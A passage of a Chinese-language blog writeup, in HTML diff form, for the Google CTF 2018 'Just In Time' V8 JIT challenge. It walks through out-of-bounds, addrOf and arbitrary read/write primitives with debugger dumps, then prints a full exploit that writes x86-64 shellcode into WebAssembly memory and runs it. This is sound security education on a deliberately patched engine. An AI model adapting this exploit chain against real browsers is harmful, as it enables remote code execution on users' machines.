class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">poc</span>(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
+<p>成功越界讀取<br><img src="/2023/10/27/Google-CTF-2018-Just-In-Time/oob.png"></p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="addrOf-primitive"><a href="#addrOf-primitive" class="headerlink" title="addrOf primitive"></a>addrOf primitive</h3><p>利用乘法可以擴大讀取範圍<br>可以調一下 index 讓 double_arr 讀取到 obj_arr 的 elements，這樣就能 leak address<br><code>%DebugPrint()</code> 似乎會影響內存布局，這邊我用 –print-code 選項讓他印出編譯好的 assembly，找到 double_arr 載入 elements 的地方下斷點，這樣就能找到 elements 的位置，obj_arr 應該在 double_arr 下面一點的位置，慢慢 ni 然後看內存可以找到 element_arr 的 element，計算 offset 就可以找到正確的 index 了</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">trigger, idx, obj</span>)&#123;</span><br><span class="line">	<span class="keyword">let</span> double_arr = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>, <span class="number">1.7</span>, <span class="number">1.8</span>, <span class="number">1.9</span>];</span><br><span class="line">	<span class="keyword">let</span> obj_arr = [&#123;&#125;];</span><br><span class="line">	<span class="keyword">let</span> x = trigger == <span class="number">0</span> ? <span class="number">9007199254740989</span> : <span class="number">9007199254740992</span>;</span><br><span class="line">	x = x + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">	x -= <span class="number">9007199254740991</span>;</span><br><span class="line">	x *= <span class="number">6</span>;</span><br><span class="line">	obj_arr[idx] = obj; <span class="comment">// prevent obj_arr be optimized away</span></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">ftoa</span>(double_arr[x]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="fakeObj-primitive"><a href="#fakeObj-primitive" class="headerlink" title="fakeObj primitive"></a>fakeObj primitive</h3><p>接下來嘗試用 oob 讀取 double_arr 的 map，但失敗了<br>有讀到看起來很像的東西，但在後續構造 arbitrary read&#x2F;write 的時候失敗了，我找不到原因所以換個方法</p>
+<h3 id="arbitrary-read-write-primitive"><a href="#arbitrary-read-write-primitive" class="headerlink" title="arbitrary read&#x2F;write primitive"></a>arbitrary read&#x2F;write primitive</h3><p>嘗試宣告一個 ArrayBuffer 並在函數內部宣告一個 Float64Array，嘗試找到 Float64Array 存資料的 pointer<br>跟前面一樣在 double_arr 載入 elements 的位置下斷點</p>
+<p>在下面一點的地方應該有這樣的 code，這邊是宣告 Float64Array 的地方，把斷點下在 <code>call r10</code> 後面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x2879719c5ce3   123  48b90122804a61180000 REX.W movq rcx,0x18614a802201    ;; object: 0x18614a802201 &lt;ArrayBuffer map = 0x34559a284aa1&gt;</span><br><span class="line">0x2879719c5ced   12d  488b75c8       REX.W movq rsi,[rbp-0x38]</span><br><span class="line">0x2879719c5cf1   131  48b8594491476e380000 REX.W movq rax,0x386e47914459    ;; object: 0x386e47914459 &lt;JSFunction Float64Array (sfi = 0xf1f45795eb9)&gt;</span><br><span class="line">0x2879719c5cfb   13b  498b55a0       REX.W movq rdx,[r13-0x60] (root (0x1e7f916825b1 &lt;undefined&gt;))</span><br><span class="line">0x2879719c5cff   13f  488bd8         REX.W movq rbx,rax</span><br><span class="line">0x2879719c5d02   142  488bfa         REX.W movq rdi,rdx</span><br><span class="line">0x2879719c5d05   145  49ba803f11c9ae550000 REX.W movq r10,0x55aec9113f80  (CreateTypedArray)</span><br><span class="line">0x2879719c5d0f   14f  41ffd2         call r10</span><br></pre></td></tr></table></figure>
+<p>下 <code>c</code> 找到 double_arr 的 elements 之後下 <code>c</code>，double_array 後面應該會有 Float64Array，找到指向 buffer 的 pointer</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/32gx 0x367469ba1c41-1</span><br><span class="line">0x367469ba1c40:	0x00001e7f91683539	0x0000000900000000</span><br><span class="line">0x367469ba1c50:	0x3ff199999999999a	0x3ff3333333333333</span><br><span class="line">0x367469ba1c60:	0x3ff4cccccccccccd	0x3ff6666666666666</span><br><span class="line">0x367469ba1c70:	0x3ff8000000000000	0x3ff999999999999a</span><br><span class="line">0x367469ba1c80:	0x3ffb333333333333	0x3ffccccccccccccd</span><br><span class="line">0x367469ba1c90:	0x3ffe666666666666	0x000034559a284c81</span><br><span class="line">0x367469ba1ca0:	0x00001e7f91682d29	0x0000367469ba1ce1</span><br><span class="line">0x367469ba1cb0:	0x000018614a802201	0x0000000000000000</span><br><span class="line">0x367469ba1cc0:	0x0000010000000000	0x0000002000000000</span><br><span class="line">0x367469ba1cd0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x367469ba1ce0:	0x00001e7f916845c9	0x0000002000000000</span><br><span class="line">0x367469ba1cf0:	0x0000000000000000	0x000055aeca03d1f0</span><br><span class="line">0x367469ba1d00:	0x00001e7f91683539	0x0000000900000000</span><br><span class="line">0x367469ba1d10:	0x0000000000000000	0x3ff3333333333333</span><br><span class="line">0x367469ba1d20:	0x3ff4cccccccccccd	0x3ff6666666666666</span><br><span class="line">0x367469ba1d30:	0x3ff8000000000000	0x3ff999999999999a</span><br><span class="line"></span><br><span class="line">gef➤  job 0x367469ba1c99</span><br><span class="line">0x367469ba1c99: [JSTypedArray]</span><br><span class="line"> - map: 0x34559a284c81 &lt;Map(FLOAT64_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x386e47914559 &lt;Object map = 0x34559a284cd1&gt;</span><br><span class="line"> - elements: 0x367469ba1ce1 &lt;FixedFloat64Array[32]&gt; [FLOAT64_ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - buffer: 0x18614a802201 &lt;ArrayBuffer map = 0x34559a284aa1&gt;</span><br><span class="line"> - byte_offset: 0</span><br><span class="line"> - byte_length: 256</span><br><span class="line"> - length: 32</span><br><span class="line"> - properties: 0x1e7f91682d29 &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"> - elements: 0x367469ba1ce1 &lt;FixedFloat64Array[32]&gt; &#123;</span><br><span class="line">        0-31: 0</span><br><span class="line"> &#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    (nil)</span><br><span class="line">    (nil)</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>但 0x18614a802201 是個 object，真正存資料的地方是在 <code>0x000055aeca03d1f0</code> 這裡，這是一個 heap 上的位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gef➤  telescope 0x18614a802201-1</span><br><span class="line">0x000018614a802200│+0x0000: 0x000034559a284aa1  →  0x0800001e7f916822</span><br><span class="line">0x000018614a802208│+0x0008: 0x00001e7f91682d29  →  0x0000001e7f916828</span><br><span class="line">0x000018614a802210│+0x0010: 0x00001e7f91682d29  →  0x0000001e7f916828</span><br><span class="line">0x000018614a802218│+0x0018: 0x0000010000000000</span><br><span class="line">0x000018614a802220│+0x0020: 0x000055aeca03d1f0  →  0x0000000000000000</span><br><span class="line">0x000018614a802228│+0x0028: 0x0000000000000004</span><br><span class="line">0x000018614a802230│+0x0030: 0x0000000000000000</span><br><span class="line">0x000018614a802238│+0x0038: 0x0000000000000000</span><br><span class="line">0x000018614a802240│+0x0040: 0x00001e7f916833f9  →  0x0000001e7f916822</span><br><span class="line">0x000018614a802248│+0x0048: 0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>而這個東西也在 double_arr 的附近，可以用 oob 改成我們要操作的地址並回傳一個新的 Float64Array，這樣就有任意位置讀寫了</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> rw_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">g</span>(<span class="params">trigger, idx, addr</span>) &#123;</span><br><span class="line">	<span class="keyword">let</span> double_arr = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>, <span class="number">1.7</span>, <span class="number">1.8</span>, <span class="number">1.9</span>];</span><br><span class="line">	<span class="keyword">let</span> result = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(rw_buffer);</span><br><span class="line">	<span class="keyword">let</span> x = trigger == <span class="number">0</span> ? <span class="number">9007199254740989</span> : <span class="number">9007199254740992</span>;</span><br><span class="line">	x = x + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">	x -= <span class="number">9007199254740991</span>;</span><br><span class="line">	x *= <span class="number">7</span>;</span><br><span class="line">	trigger = result[idx];</span><br><span class="line">	double_arr[x] = <span class="title function_">itof</span>(addr);</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="透過-wasm-寫入-shellcode"><a href="#透過-wasm-寫入-shellcode" class="headerlink" title="透過 wasm 寫入 shellcode"></a>透過 wasm 寫入 shellcode</h3><p>後續利用就很簡單了，透過任意寫竄改 wasm 的內容就可以了</p>
+<p>成功彈出計算機<br><img src="/2023/10/27/Google-CTF-2018-Just-In-Time/result.png"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">var</span> bigUnit64 = <span class="keyword">new</span> <span class="title class_">BigInt64Array</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftoi</span>(<span class="params">value</span>)&#123;</span><br><span class="line">	float64[<span class="number">0</span>] = value;</span><br><span class="line">	<span class="keyword">return</span> bigUnit64[<span class="number">0</span>];	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">itof</span>(<span class="params">value</span>)&#123;</span><br><span class="line">	bigUnit64[<span class="number">0</span>] = value;</span><br><span class="line">	<span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">value</span>)&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + value.<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftoh</span>(<span class="params">value</span>)&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">hex</span>(<span class="title function_">ftoi</span>(value));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftoa</span>(<span class="params">value</span>)&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">ftoi</span>(value) &gt;&gt; <span class="number">1n</span> &lt;&lt; <span class="number">1n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">atof</span>(<span class="params">value</span>)&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">itof</span>(value | <span class="number">1n</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">trigger, idx, obj</span>)&#123;</span><br><span class="line">	<span class="keyword">let</span> double_arr = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>, <span class="number">1.7</span>, <span class="number">1.8</span>, <span class="number">1.9</span>];</span><br><span class="line">	<span class="keyword">let</span> obj_arr = [&#123;&#125;];</span><br><span class="line">	<span class="keyword">let</span> x = trigger == <span class="number">0</span> ? <span class="number">9007199254740989</span> : <span class="number">9007199254740992</span>;</span><br><span class="line">	x = x + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">	x -= <span class="number">9007199254740991</span>;</span><br><span class="line">	x *= <span class="number">6</span>;</span><br><span class="line">	obj_arr[idx] = obj; <span class="comment">// prevent obj_arr be optimized away</span></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">ftoa</span>(double_arr[x]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">	<span class="title function_">f</span>(<span class="number">0</span>, <span class="number">0</span>, &#123;&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rw_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">g</span>(<span class="params">trigger, idx, addr</span>) &#123;</span><br><span class="line">	<span class="keyword">let</span> double_arr = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>, <span class="number">1.7</span>, <span class="number">1.8</span>, <span class="number">1.9</span>];</span><br><span class="line">	<span class="keyword">let</span> result = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(rw_buffer);</span><br><span class="line">	<span class="keyword">let</span> x = trigger == <span class="number">0</span> ? <span class="number">9007199254740989</span> : <span class="number">9007199254740992</span>;</span><br><span class="line">	x = x + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">	x -= <span class="number">9007199254740991</span>;</span><br><span class="line">	x *= <span class="number">7</span>;</span><br><span class="line">	trigger = result[idx];</span><br><span class="line">	double_arr[x] = <span class="title function_">itof</span>(addr);</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">	<span class="title function_">g</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0n</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrOf</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">f</span>(<span class="number">1</span>, <span class="number">0</span>, obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_arr</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">0</span>)&#123;</span><br><span class="line">		addr += <span class="number">1n</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">g</span>(<span class="number">1</span>, <span class="number">0</span>, addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule);</span><br><span class="line"><span class="keyword">var</span> wasmInstance_addr = <span class="title function_">addrOf</span>(wasmInstance);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;wasm instance address: &quot;</span>, <span class="title function_">hex</span>(wasmInstance_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> tmp_arr = <span class="title function_">get_arr</span>(wasmInstance_addr);</span><br><span class="line"><span class="comment">//theoretically it don&#x27;t have to left shift, but idk why QwQ</span></span><br><span class="line"><span class="comment">//maybe there are some bug in my exp</span></span><br><span class="line"><span class="keyword">var</span> wasm_addr = <span class="title function_">ftoa</span>(tmp_arr[<span class="number">0x1d</span>]) &lt;&lt; <span class="number">8n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;wasm address: &quot;</span> + <span class="title function_">hex</span>(wasm_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> win_owob = <span class="title function_">get_arr</span>(wasm_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x10101010101b848n</span>,    <span class="number">0x62792eb848500101n</span>,    <span class="number">0x431480101626d60n</span>,    <span class="number">0x2f7273752fb84824n</span>,</span><br><span class="line">    <span class="number">0x48e78948506e6962n</span>,    <span class="number">0x1010101010101b8n</span>,    <span class="number">0x6d606279b8485001n</span>,    <span class="number">0x2404314801010162n</span>,</span><br><span class="line">    <span class="number">0x1485e086a56f631n</span>,    <span class="number">0x313b68e6894856e6n</span>,    <span class="number">0x101012434810101n</span>,    <span class="number">0x4c50534944b84801n</span>,</span><br><span class="line">    <span class="number">0x6a52d231503d5941n</span>,    <span class="number">0x894852e201485a08n</span>,    <span class="number">0x50f583b6ae2n</span>,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++)&#123;</span><br><span class="line">	win_owob[i] = <span class="title function_">itof</span>(shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line">wasmInstance.<span class="property">exports</span>.<span class="title function_">main</span>();</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF-writeup/" rel="tag"># CTF writeup</a>
+              <a href="/tags/V8/" rel="tag"># V8</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/10/12/Balsn-CTF-2023-Writeup/" rel="prev" title="Balsn CTF 2023 Writeup">
+      <i class="fa fa-chevron-left"></i> Balsn CTF 2023 Writeup
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/09/08/CodeQL-for-V8/" rel="next" title="CodeQL for V8">
+      CodeQL for V8 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%92%B0%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">環境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#patch-%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">patch 分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nosandbox-patch"><span class="nav-number">2.1.</span> <span class="nav-text">nosandbox.patch</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#addition-reducer-patch"><span class="nav-number">2.2.</span> <span class="nav-text">addition-reducer.patch</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%88%E4%BD%B5%E5%89%8D%E7%9A%84%E7%AF%80%E9%BB%9E"><span class="nav-number">2.2.1.</span> <span class="nav-text">合併前的節點</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%88%E4%BD%B5%E5%BE%8C%E7%9A%84%E7%AF%80%E9%BB%9E"><span class="nav-number">2.2.2.</span> <span class="nav-text">合併後的節點</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#typer-phase"><span class="nav-number">2.2.3.</span> <span class="nav-text">typer phase</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#typed-lowering-phase"><span class="nav-number">2.2.4.</span> <span class="nav-text">typed lowering phase</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PoC"><span class="nav-number">3.</span> <span class="nav-text">PoC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">4.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#addrOf-primitive"><span class="nav-number">4.1.</span> <span class="nav-text">addrOf primitive</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fakeObj-primitive"><span class="nav-number">4.2.</span> <span class="nav-text">fakeObj primitive</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#arbitrary-read-write-primitive"><span class="nav-number">4.3.</span> <span class="nav-text">arbitrary read&#x2F;write primitive</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%8F%E9%81%8E-wasm-%E5%AF%AB%E5%85%A5-shellcode"><span class="nav-number">4.4.</span> <span class="nav-text">透過 wasm 寫入 shellcode</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Terry1234</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Terry1234</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
